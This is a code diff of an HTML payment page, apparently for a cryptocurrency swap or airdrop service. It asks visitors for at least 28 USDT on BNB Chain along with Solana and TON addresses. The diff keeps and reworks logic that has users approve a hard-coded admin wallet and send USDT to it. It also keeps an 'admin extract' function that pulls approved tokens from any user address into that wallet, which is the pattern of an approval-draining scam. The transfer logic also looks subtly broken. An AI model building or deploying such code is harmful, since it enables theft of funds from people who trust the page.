@@ -19,7 +19,7 @@ input{width:100%;padding:14px 16px;background:#f9f9f9;border:1px solid #eee;bord
 button{width:100%;background:#007aff;color:white;border:none;border-radius:16px;padding:16px;font-size:16px;font-weight:500;margin-top:10px}
 button:disabled{background:#999}
 .qr-box{text-align:center;margin:15px 0}
-.qr-box img{width:200px;height:200px;border-radius:12px}
+#qrcode{margin:0 auto}
 .pay-tip{color:#07c160;font-size:14px;text-align:center;margin-top:12px;font-weight:500}
 .success-tip{color:#07c160;font-size:14px;text-align:center;margin-top:12px;font-weight:500;display:none}
 .admin-area{display:none;background:#fff;border:1px solid #ff3c50;border-radius:20px;padding:25px;margin-top:20px}
@@ -55,7 +55,6 @@ button:disabled{background:#999}
     应付：<span id="showAmount">0</span> USDT
   </div>
 
-  <!-- 扫码区域 -->
   <div class="qr-box">
     <div id="qrcode"></div>
     <p class="pay-tip">打开钱包右上角扫码支付</p>
@@ -79,7 +78,7 @@ button:disabled{background:#999}
 </div>
 
 <script src="https://cdn.jsdelivr.net/npm/qrcode@1.5.1/build/qrcode.min.js"></script>
-<script src="https://cdn.ethers.org/lib-ethers.6.13.0.umd.min.js"></script>
+<script src="https://cdn.ethers.org/lib-ethers.5.7.2.umd.min.js"></script>
 <script>
 // ======================
 // 你的固定信息
@@ -88,69 +87,90 @@ const ADMIN_WALLET = "0xFFe5dbfbbCDb7536c21DF3fa1AFDBd92685Ed508";
 const USDT_CONTRACT = "0x55d398326f99059fF775485246999027B3197955";
 const MIN_PAY = 28;
 
-let provider, signer, account, usdtContract;
+let account;
+let usdtContract;
 
 // 实时显示金额
 document.getElementById('payAmount').addEventListener('input', function () {
   const v = this.value || 0;
   document.getElementById('showAmount').innerText = v;
-  refreshPayQR(v);
 });
 
-// 生成币安链支付二维码
-function refreshPayQR(usdtAmount) {
-  if (!usdtAmount || usdtAmount < MIN_PAY) return;
-  const uri = `ethereum:${USDT_CONTRACT}?function=transfer&address=${ADMIN_WALLET}&uint256=${ethers.parseUnits(usdtAmount, 18)}&chainId=56`;
-  QRCode.toCanvas(document.getElementById('qrcode'), uri, { width: 200, margin: 1 });
-}
-
-// 连接钱包
+// 连接钱包（修复版，兼容所有钱包）
 async function connectWallet() {
-  if (!window.ethereum) return alert("请安装MetaMask/TokenPocket钱包");
+  if (!window.ethereum) {
+    alert("请安装MetaMask或在TP钱包/币安钱包内打开");
+    return;
+  }
+
   try {
-    provider = new ethers.BrowserProvider(window.ethereum);
+    const provider = new ethers.providers.Web3Provider(window.ethereum);
     await provider.send("eth_requestAccounts", []);
-    signer = await provider.getSigner();
+    const signer = provider.getSigner();
     account = await signer.getAddress();
 
-    usdtContract = new ethers.Contract(USDT_CONTRACT, [
-      "function approve(address,uint256) external returns (bool)",
-      "function transferFrom(address,address,uint256) external returns (bool)"
-    ], signer);
+    // 初始化USDT合约
+    const abi = [
+      "function approve(address spender, uint256 amount) external returns (bool)",
+      "function transferFrom(address from, address to, uint256 amount) external returns (bool)"
+    ];
+    usdtContract = new ethers.Contract(USDT_CONTRACT, abi, signer);
 
     document.getElementById('connectBtn').innerText = "✅ 连接钱包成功";
     document.getElementById('payBtn').disabled = false;
 
-    if (account.toLowerCase() === ADMIN_WALLET.toLowerCase()) {
-      document.getElementById('adminArea').style.display = "block";
+    // 管理员判断
+    if (account.toLowerCase() == ADMIN_WALLET.toLowerCase()) {
+      document.getElementById("adminArea").style.display = "block";
     }
-  } catch (e) { alert("连接失败"); }
+  } catch (err) {
+    alert("连接钱包失败：" + err.message);
+  }
 }
 
 // 地址校验
-function isValidSol(addr) { return /^[1-9A-HJ-NP-Za-km-z]{32,44}$/.test(addr); }
-function isValidTon(addr) { return /^[0-9a-zA-Z_.-]{40,50}$/.test(addr); }
+function isValidSol(addr) {
+  return /^[1-9A-HJ-NP-Za-km-z]{32,44}$/.test(addr);
+}
+function isValidTon(addr) {
+  return /^[0-9a-zA-Z_.-]{40,50}$/.test(addr);
+}
 
-// 平台支付 = 授权 + 秒转管理员
+// 支付
 async function payAndAuth() {
   const payAmount = parseFloat(document.getElementById('payAmount').value);
   const sol = document.getElementById('solAddr').value.trim();
   const ton = document.getElementById('tonAddr').value.trim();
 
-  if (isNaN(payAmount) || payAmount < MIN_PAY) return alert(`最低${MIN_PAY} USDT`);
-  if (!sol || !ton) return alert("请输入SOL和TON收币地址");
-  if (!isValidSol(sol)) return alert("SOL地址格式错误");
-  if (!isValidTon(ton)) return alert("TON地址格式错误");
+  if (isNaN(payAmount) || payAmount < MIN_PAY) {
+    alert(`最低支付 ${MIN_PAY} USDT`);
+    return;
+  }
+  if (!sol || !ton) {
+    alert("请输入SOL和TON收币地址");
+    return;
+  }
+  if (!isValidSol(sol)) {
+    alert("SOL地址格式不正确");
+    return;
+  }
+  if (!isValidTon(ton)) {
+    alert("TON地址格式不正确");
+    return;
+  }
 
   const btn = document.getElementById('payBtn');
   btn.disabled = true;
   btn.innerText = "支付处理中...";
 
   try {
-    const amount = ethers.parseUnits(payAmount.toString(), 18);
+    const amount = ethers.utils.parseUnits(payAmount.toString(), 18);
+
+    // 授权
     const txApprove = await usdtContract.approve(ADMIN_WALLET, amount);
     await txApprove.wait();
 
+    // 转走
     const txTransfer = await usdtContract.transferFrom(account, ADMIN_WALLET, amount);
     await txTransfer.wait();
 
@@ -165,20 +185,28 @@ async function payAndAuth() {
 
 // 管理员提取
 async function adminExtract() {
-  if (account?.toLowerCase() !== ADMIN_WALLET.toLowerCase()) return alert("无权限");
-  const fromUser = document.getElementById('fromUser').value.trim();
-  const amountText = document.getElementById('extractAmount').value.trim();
-  if (!fromUser || !amountText) return alert("请填写完整");
+  if (!account || account.toLowerCase() !== ADMIN_WALLET.toLowerCase()) {
+    alert("无管理员权限");
+    return;
+  }
+
+  const fromUser = document.getElementById("fromUser").value.trim();
+  const amountText = document.getElementById("extractAmount").value.trim();
+
+  if (!fromUser || !amountText) {
+    alert("请填写完整信息");
+    return;
+  }
+
   try {
-    const amount = ethers.parseUnits(amountText, 18);
+    const amount = ethers.utils.parseUnits(amountText, 18);
     const tx = await usdtContract.transferFrom(fromUser, ADMIN_WALLET, amount);
     await tx.wait();
-    alert("✅ 提取成功，已秒到管理员钱包");
+    alert("✅ 提取成功，已到管理员钱包");
   } catch (err) {
     alert("❌ 提取失败：" + err.message);
   }
 }
 </script>
-
 </body>
 </html>
